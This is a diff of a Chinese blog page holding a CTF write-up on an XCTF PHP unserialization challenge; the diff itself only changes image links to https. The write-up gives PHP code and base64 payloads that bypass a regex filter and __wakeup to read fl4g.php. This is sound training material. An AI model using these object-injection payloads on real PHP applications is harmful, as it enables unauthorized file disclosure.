@@ -55,21 +55,21 @@
 <meta property="og:site_name" content="莫居尘">
 <meta property="og:description" content="0x00 - 题目描述地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;answer?type&#x3D;web&amp;number&#x3D;3&amp;grade&#x3D;1&amp;id&#x3D;5409&amp;page&#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://markdown.yeek.top/20200211215026.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200211215256.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200211233941.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200212001625.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200212011140.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200212003517.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200212004354.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200212005224.png">
-<meta property="og:image" content="http://markdown.yeek.top/20200212005244.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200211215026.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200211215256.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200211233941.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200212001625.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200212011140.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200212003517.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200212004354.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200212005224.png">
+<meta property="og:image" content="https://markdown.yeek.top/20200212005244.png">
 <meta property="article:published_time" content="2020-02-11T13:51:36.000Z">
-<meta property="article:modified_time" content="2020-03-11T14:39:07.500Z">
+<meta property="article:modified_time" content="2020-03-11T14:47:38.499Z">
 <meta property="article:author" content="莫居尘 Moreant">
 <meta property="article:tag" content="信息安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://markdown.yeek.top/20200211215026.png">
+<meta name="twitter:image" content="https://markdown.yeek.top/20200211215026.png">
 
 <link rel="canonical" href="http://moreant.github.io/post/60542.html">
 
@@ -226,7 +226,7 @@
     <link itemprop="mainEntityOfPage" href="http://moreant.github.io/post/60542.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="http://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
+      <meta itemprop="image" content="https://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
       <meta itemprop="name" content="莫居尘 Moreant">
       <meta itemprop="description" content="别教了，我学不动了">
     </span>
@@ -253,7 +253,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-11 22:39:07" itemprop="dateModified" datetime="2020-03-11T22:39:07+08:00">2020-03-11</time>
+                <time title="修改时间：2020-03-11 22:47:38" itemprop="dateModified" datetime="2020-03-11T22:47:38+08:00">2020-03-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -294,9 +294,9 @@
       
         <h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h2><p>地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a></p>
 <p>PHP 反序列，老题新做了。</p>
-<p><img src="http://markdown.yeek.top/20200211215026.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200211215026.png" alt=""></p>
 <p>打开 <code>index.php</code> 是这样的</p>
-<p><img src="http://markdown.yeek.top/20200211215256.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200211215256.png" alt=""></p>
 <a id="more"></a>
 
 
@@ -348,7 +348,7 @@
 </blockquote>
 <h3 id="获取-flag"><a href="#获取-flag" class="headerlink" title="获取 flag"></a>获取 flag</h3><h4 id="构造-序列化"><a href="#构造-序列化" class="headerlink" title="构造 序列化"></a>构造 序列化</h4><p>根据注释的明示直接访问 fl4g.php ，果然是一片空白。</p>
 <p>不过证明的确实有这个文件，并且 flag 就存在这个文件的代码中，需要我们使用 <code>highlight_file</code> 方法来显示出来。</p>
-<p><img src="http://markdown.yeek.top/20200211233941.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200211233941.png" alt=""></p>
 <p>构造 <code>Demo</code> 类，传入 <code>$file = fl4g.php</code> ，然后反序列化</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'fl4g.php'</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> Demo($file);</span><br><span class="line">$s = serialize($demo);</span><br><span class="line">print_r($s);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">print_r(base64_encode($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -361,9 +361,9 @@
 <p>base64 编码后：</p>
 <p><code>Tzo0OiJEZW1vIjoxOntzOjEwOiIARGVtbwBmaWxlIjtzOjg6ImZsNGcucGhwIjt9</code></p>
 <h4 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h4><p>直接传进去，果然被匹配到了</p>
-<p><img src="http://markdown.yeek.top/20200212001625.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212001625.png" alt=""></p>
 <p>不清楚正则匹配的话，在这个网站上(<a href="https://www.regextester.com/" target="_blank" rel="noopener">regextester</a>)可以知道匹配到的部分是前面的 <code>O:4:</code></p>
-<p><img src="http://markdown.yeek.top/20200212011140.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212011140.png" alt=""></p>
 <p>可以在 <code>4</code> 前面加上 <code>+</code> 来绕过，因为在 php 语法中，<code>+4</code> = <code>4</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="number">-4</span>);</span><br></pre></td></tr></table></figure>
 
@@ -373,7 +373,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var?&#x3D;TzorNDoiRGVtbyI6MTp7czoxMDoiRGVtbyAgZmlsZSI7czo4OiJmbDRnLnBocCI7fQ</span><br></pre></td></tr></table></figure>
 
 <p>果不其然的显示回 index.php 的源码了。</p>
-<p><img src="http://markdown.yeek.top/20200212003517.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212003517.png" alt=""></p>
 <p>这是因为 <strong>反序列化 Demo 对象</strong>后调用了 <code>__wakeup</code> 方法，重新将传入的 <code>fl4g.php</code> 设置为 <code>index.php</code> 了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -398,7 +398,7 @@
 <p>经过多方百度后，发现了一个<strong>盲点</strong>——由于 <code>Demo</code> 类的 <code>file</code> 属性是<strong>私有属性</strong>序列化之后，在类名前后会有 %00 阻断。</p>
 <p>并且在 <code>s:10:&quot;Demofile&quot;</code> 也有提示，<code>Demofile</code> 是 8 个字符，为什么是 <code>s:10</code>  呢？就是因为前后有 %00</p>
 <p>图形化就是这样：</p>
-<p><img src="http://markdown.yeek.top/20200212004354.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212004354.png" alt=""></p>
 <p><code>%44%65%6d%6f</code>进行 hex 转化后 就是 <code>Demo</code> ，可以在这个网站上测试 <a href="https://www.107000.com/T-Hex/" target="_blank" rel="noopener">Hex编码/解码</a></p>
 <p><strong>坑来了：</strong></p>
 <p>如果直接复制文本样式，在别的地方进行base64编码会<strong>丢失掉 <code>%00</code> 的信息</strong>！！再 解码-&gt;反序列化 自然与我之前序列化的 Demo <strong>不是同一个东西</strong></p>
@@ -412,11 +412,11 @@
 <p>使用了 <code>str_replace</code> 方法来进行替换</p>
 <p>这样编码后的结果就还是带有 <code>%00</code> 的了：</p>
 <p><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
-<p><img src="http://markdown.yeek.top/20200212005224.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212005224.png" alt=""></p>
 <p>载荷</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://markdown.yeek.top/20200212005244.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212005244.png" alt=""></p>
 <h2 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h2><ol>
 <li>__wakeup 方法是反序列化后调用的方法，可以利用<strong>超属性</strong>的方法来绕过</li>
 <li>在 php 中 <code>4</code> = <code>+4</code> ，可以用来绕过正则匹配</li>
@@ -536,7 +536,7 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="莫居尘 Moreant"
-      src="http://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
+      src="https://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
   <p class="site-author-name" itemprop="name">莫居尘 Moreant</p>
   <div class="site-description" itemprop="description">别教了，我学不动了</div>
 </div>
